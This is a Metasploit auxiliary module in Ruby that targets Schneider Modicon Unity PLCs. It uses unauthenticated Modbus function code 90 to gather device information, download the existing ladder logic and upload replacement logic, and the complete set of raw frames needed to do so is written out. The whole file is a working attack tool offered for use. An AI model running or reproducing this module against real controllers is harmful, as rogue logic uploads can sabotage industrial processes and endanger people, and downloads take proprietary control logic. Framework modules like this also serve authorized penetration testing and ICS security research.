##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Schneider Modicon Ladder Logic Upload/Download',
      'Description'    => %q{
        The Schneider Modicon with Unity series of PLCs use Modbus function
        code 90 (0x5a) to send and receive ladder logic.  The protocol is
        unauthenticated, and allows a rogue host to retrieve the existing
        logic and to upload new logic.

        Three actions are supported : Gather informations,
        download the ladder logic or upload a new ladder logic.
        In either mode, FILENAME must be set to a valid path to an existing
        file (UPLOAD) or a new file (DOWNLOAD), and the directory must
        already exist.  The default, 'modicon_ladder.apx' is a blank
        ladder logic file which can be used for testing.

        This module is based on the original 'modiconstux.rb' Basecamp module from
        DigitalBond.
      },
      'Author'         =>
        [
          'Arnaud Soullie <arnaud.soullie[at]solucom.fr>', # fix module, add info gathering, refactor
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb' # Metasploit fixups
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
        ],
      'DisclosureDate' => 'Apr 5 2012',
      'Actions'        =>
        [
          ['GATHER_INFOS', { 'Description' => 'Get informations about the PLC configuration' } ],
          ['DOWNLOAD', { 'Description' => 'Download the ladder logic from the PLC' } ],
          ['UPLOAD', { 'Description' => 'Upload a ladder logic file to the PLC' } ],
        ]
      ))

    register_options(
      [
        OptString.new('FILENAME',
          [
            true,
            "The file to send or receive",
            File.join(Msf::Config.data_directory, "exploits", "modicon_ladder.apx")
          ]),
        Opt::RPORT(502)
      ], self.class)

  end

  def run
    unless valid_filename?
      print_error "FILENAME invalid: #{datastore['FILENAME'].inspect}"
      return nil
    end
    @modbus_counter = 0x0000 # used for modbus frames
    connect
    init
    case datastore['ACTION']
    when "DOWNLOAD"
      readfile
    when "UPLOAD"
      writefile
    when "GATHER_INFOS"
      gather_infos
    end
  end

  def handle_error(response)
    case response.reverse.unpack("c")[0].to_i
    when 1
      print_error("Error : ILLEGAL FUNCTION")
    when 2
      print_error("Error : ILLEGAL DATA ADDRESS")
    when 3
      print_error("Error : ILLEGAL DATA VALUE")
    when 4
      print_error("Error : SLAVE DEVICE FAILURE")
    when 6
      print_error("Error : SLAVE DEVICE BUSY")
    else
      print_error("Unknown error")
    end
    exit
  end

  def valid_filename?
    if datastore['MODE'] == "SEND"
      File.readable? datastore['FILENAME']
    else
      File.writable?(File.split(datastore['FILENAME'])[0].to_s)
    end
  end

  # this is used for building a Modbus frame
  # just prepends the payload with a modbus header
  def make_frame(packetdata)
    if packetdata.size > 255
      print_error("#{rhost}:#{rport} - MODBUS - Packet too large: #{packetdata.inspect}")
      return
    end
    payload = [@modbus_counter].pack("n")
    payload += "\x00\x00\x00" #dunno what these are
    payload += [packetdata.size].pack("c") # size byte
    payload += packetdata
  end

  # a wrapper just to be sure we increment the counter
  def send_frame(payload)
    sock.put(payload)
    @modbus_counter += 1
    r = sock.get(sock.def_read_timeout)
    if r.nil?
      print_error("No answer from target")
      exit
    elsif r.unpack("C*")[-2] == 218
      #print_error("Apparently there is an error")
      #handle_error(r)
      return r
    else
      return r
    end
  end

  # This function sends some initialization requests
  # required for priming the Quantum
  def init
    send_frame(make_frame("\x00\x5a\x00\x02"))
    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
    send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
    send_frame(make_frame("\x00\x5a\x00\x03\x00"))
    send_frame(make_frame("\x00\x5a\x00\x03\x04"))
    send_frame(make_frame("\x00\x5a\x00\x04"))
    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
    payload = "\x00\x5a\x00\x0a\x00"
    (0..0xf9).each { |x| payload += [x].pack("c") }
    send_frame(make_frame(payload))
    send_frame(make_frame("\x00\x5a\x00\x04"))
    send_frame(make_frame("\x00\x5a\x00\x04"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x5a\x01\x00\x00\xf6\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x5a\x02\x00\x00\xf6\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x46\x03\x00\x00\xf6\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x3c\x04\x00\x00\xf6\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x32\x05\x00\x00\xf6\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x28\x06\x00\x00\x0c\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
    payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
    #payload += "USER-714E74F21B" # Yep, really
    payload += "META-SPLOITMETA"
    send_frame(make_frame(payload))
    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x0b"))
    send_frame(make_frame("\x00\x5a\x01\x50\x15\x00\x01\x07"))
    send_frame(make_frame("\x00\x5a\x01\x12"))
    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x01\x12"))
    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x00\x02"))
    send_frame(make_frame("\x00\x5a\x00\x58\x01\x00\x00\x00\x00\xff\xff\x00\x70"))
    send_frame(make_frame("\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"))
    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"))
  end


  def gather_infos
    print_status("Sending initialization requests ...")
    api = send_frame(make_frame("\x00\x5a\x00\x02"))
    print_good("PLC model : " + api.split[1].to_s + ' ' + api.split[2] + ' ' + api.split[3][0..3])
    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
    send_frame(make_frame("\x00\x5a\x00\x0a\x00" + 'T' * 0xf9))
    project_name = send_frame(make_frame("\x00\x5a\x00\x03\x00"))
    print_good('Project name : ' + project_name.split[2].to_s)
    send_frame(make_frame("\x00\x5a\x00\x03\x04"))
    send_frame(make_frame("\x00\x5a\x00\x04"))
    send_frame(make_frame("\x00\x5a\x00\x01\x00"))
    payload = "\x00\x5a\x00\x0a\x00"
    (0..0xf9).each { |x| payload += [x].pack("c") }
    send_frame(make_frame(payload))
    send_frame(make_frame("\x00\x5a\x00\x04"))
    send_frame(make_frame("\x00\x5a\x00\x04"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"))
    send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"))
    data = send_frame(make_frame("\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"))
    tableau = []
    data.bytes.each do |byte|
      tableau.push(byte.to_s)
    end
    @uaelbat = tableau.reverse
    nb_to_delete = 1
    for i in 1..tableau.size
      if @uaelbat[i].to_s != '0'
        break
      elsif @uaelbat[i].to_s == '0'
        nb_to_delete +=1
      end
    end
    tableau2 = @uaelbat[nb_to_delete..@uaelbat.size]
    test = tableau2.split('0')
    unity_version = ''
    test[0].each do |char|
      unity_version += [char.to_i].pack("c")
    end
    print_good("Unity software version : " + unity_version.reverse)
    comments =''
    test[7].each do |char|
      comments += [char.to_i].pack("c")
    end
    print_good("Project comments : " + comments.reverse)
  end




  # Write the contents of local file filename to the target's filenumber
  # blank logic files will be available on the Digital Bond website
  def writefile
    print_status "#{rhost}:#{rport} - MODBUS - Sending write request"
    #blocksize = 244  # bytes per block in file transfer
    blocksize = 218 # bytes per block in file transfer
    buf = File.open(datastore['FILENAME'], 'rb') { |io| io.read }
    fullblocks = buf.length / blocksize
    #if fullblocks > 255
    # print_error("#{rhost}:#{rport} - MODBUS - File too large, aborting.")
    # return
    #end
    print_status "Total number of blocks : #{fullblocks}"
    lastblocksize = buf.length - (blocksize*fullblocks)
    lastblocksize_enhexa = [lastblocksize].pack("c")
    print_status "Last block size : #{lastblocksize}"
    fileblocks = fullblocks
    if lastblocksize != 0
      fileblocks += 1
    end
    filetype = buf[0..2]
    if filetype == "APX"
      filenum = "\x01"
    elsif filetype == "APB"
      filenum = "\x10"
    end
    send_frame(make_frame("\x00\x5a\x01\x41\xff\x00"))
    send_frame(make_frame("\x00\x5a\x00\x03\x01"))
    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x00\x02"))
    send_frame(make_frame("\x00\x5a\x00\x02"))
    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x00\x58\x02\x01\x00\x00\x00\x00\x00\xe1\x00"))
    send_frame(make_frame("\x00\x5a\x00\x02"))


    send_frame(make_frame("\x00\x5a\x01\x04"))
    send_frame(make_frame("\x00\x5a\x00\x03\x01"))
    send_frame(make_frame("\x00\x5a\x00\x02"))
    send_frame(make_frame("\x00\x5a\x00\x02"))
    send_frame(make_frame("\x00\x5a\x01\x04"))


    payload = "\x00\x5a\x01\x30\x00"
    payload += filenum
    response = send_frame(make_frame(payload))
    if response[8..9] == "\x01\xfe"
      print_status("#{rhost}:#{rport} - MODBUS - Write request success!  Writing file...")
    else
      print_error("#{rhost}:#{rport} - MODBUS - Write request error.  Aborting.")
      return
    end
    payload = "\x00\x5a\x01\x04"
    send_frame(make_frame(payload))
    block = 1
    block2 = 0
    block_nb = 1
    block2status = 0 # block 2 must always be sent twice
    while block_nb < (fileblocks - 1)
      block_nb = block2*16*16 + block
      if block == 256
        block = 0
        block2 += 1
      end
      payload = "\x00\x5a\x01\x31\x00"
      payload += filenum
      payload += [block].pack("c")
      payload += [block2].pack("c")
      payload += "\xda\x00"
      payload += buf[(((block2*16*16 + block) - 1) * 218)..(((block2*16*16 + block) * 218) - 1)]
      res = send_frame(make_frame(payload))
      print_status "Envoi du block #{block_nb}/#{fullblocks} (#{block2}::#{block})"
      if res[8..9] != "\x01\xfe"
        print_error("#{rhost}:#{rport} - MODBUS - Failure writing block #{block_nb}")
        return
      end
      # redo this iteration of the loop if we're on block 2
      if block2status == 0 and block == 2
        print_status("#{rhost}:#{rport} - MODBUS - Sending block 2 a second time")
        block2status = 1
        redo
      end
      block += 1
    end
    if lastblocksize > 0
      print_status "Last Block !"
      print_status "Size : #{lastblocksize}"
      payload = "\x00\x5a\x01\x31\x00"
      payload += filenum
      payload += [block].pack("c")
      payload += [block2].pack("c")
      payload += [lastblocksize].pack("c") + "\x00"
      payload += buf[(((block2*16*16 + block)-1) * 218)..((((block2*16*16 + block)-1) * 218) + lastblocksize)]
      print_status "#{rhost}:#{rport} - MODBUS - Block #{block_nb}: #{payload.inspect}"
      res = send_frame(make_frame(payload))
      if res[8..9] != "\x01\xfe"
        print_error("#{rhost}:#{rport} - MODBUS - Failure writing last block")
        return
      end
    end
    vprint_status "#{rhost}:#{rport} - MODBUS - Closing file"
    payload = "\x00\x5a\x01\x32\x00\x01" + [fileblocks].pack("c") + "\x0a"
    send_frame(make_frame(payload))
  end

  # Only reading the STL file is supported at the moment :(
  def readfile
    print_status "#{rhost}:#{rport} - MODBUS - Sending read request"
    file = File.open(datastore['FILENAME'], 'wb')
    response = send_frame(make_frame("\x00\x5a\x01\x33\x00\x01\xfb\x00"))
    print_status("#{rhost}:#{rport} - MODBUS - Retrieving file")
    block = 1
    block2 = 0
    filedata = ""
    finished = false
    while !finished
      if block == 256
        block = 0
        block2 += 1
      end
      payload = "\x00\x5a\x01\x34\x00\x01"
      payload += [block].pack("c")
      payload += [block2].pack("c")
      payload += "\x00"
      response = send_frame(make_frame(payload))
      filedata += response[0xe..-1]
      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block2*255+block}: #{response[0xe..-1].inspect}"
      if response[0xa] == "\x01" # apparently 0x00 == more data, 0x01 == eof?
        finished = true
      else
        block += 1
      end
    end
    print_status("#{rhost}:#{rport} - MODBUS - Closing file  '#{datastore['FILENAME']}'")
    payload = "\x00\x5a\x01\x35\x00\x01" + [block].pack("c") + "\x00"
    send_frame(make_frame(payload))
    # I cannot use store_loot as the "session" variable is undefined. Is it because it is an auxiliary module ?
    #store_loot('schneider.ladder_logic', 'application/octet-stream', nil, filedata, 'Station.apx', 'Schneider Modicon ladder logic')
    file.print filedata
    file.close
  end

  def cleanup
    disconnect rescue nil
  end

end
